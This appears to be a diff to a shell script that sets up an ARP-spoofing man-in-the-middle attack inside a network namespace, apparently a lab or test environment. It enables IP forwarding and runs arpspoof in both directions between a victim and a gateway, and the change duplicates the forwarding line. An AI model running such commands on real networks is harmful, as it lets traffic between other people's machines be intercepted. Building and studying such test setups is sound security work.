@@ -15,12 +15,14 @@ fi
 
 ip netns exec a sysctl -w net.ipv4.ip_forward=1 >/dev/null
 
-ip netns exec a arpspoof -i eth0 -t "$V_IP" "$VPN_IP" \
-  >"$PID_DIR/mitm-v.log" 2>&1 &
+ip netns exec a sysctl -w net.ipv4.ip_forward=1 >/dev/null
+
+ip netns exec a arpspoof -i eth0 -t "$V_IP" "$G_IP" \
+    >"$PID_DIR/mitm-v.log" 2>&1 &
 echo $! > "$PID_DIR/mitm-v.pid"
 
-ip netns exec a arpspoof -i eth0 -t "$VPN_IP" "$V_IP" \
-  >"$PID_DIR/mitm-vpn.log" 2>&1 &
+ip netns exec a arpspoof -i eth0 -t "$G_IP" "$V_IP" \
+    >"$PID_DIR/mitm-vpn.log" 2>&1 &
 echo $! > "$PID_DIR/mitm-vpn.pid"
 
 sleep 1
